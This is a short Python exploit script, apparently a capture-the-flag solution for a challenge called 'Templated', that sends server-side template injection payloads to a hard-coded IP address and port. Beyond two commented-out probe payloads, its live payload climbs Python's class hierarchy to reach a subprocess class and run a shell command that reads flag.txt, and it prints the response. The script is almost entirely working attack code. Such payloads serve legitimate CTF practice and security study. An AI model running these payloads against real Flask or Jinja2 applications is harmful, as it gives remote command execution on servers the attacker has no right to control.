#!/usr/bin/python3

# Templated

# Vulnerability
# Template Injection

import requests

def connect():
    url = 'http://167.172.55.94:32217/'
    #payload = "{{7*7}}"
    #payload = "{{ config.items() }}"
    payload = "{{ ''.__class__.__mro__[1].__subclasses__()[414]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip() }}"

    r = requests.get(url + payload)
    print(r.text)

if __name__ == '__main__':
    connect()

# References
# https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee
# https://gist.github.com/mgeeky/fd994a067e3407fd87e8c224e65df8d8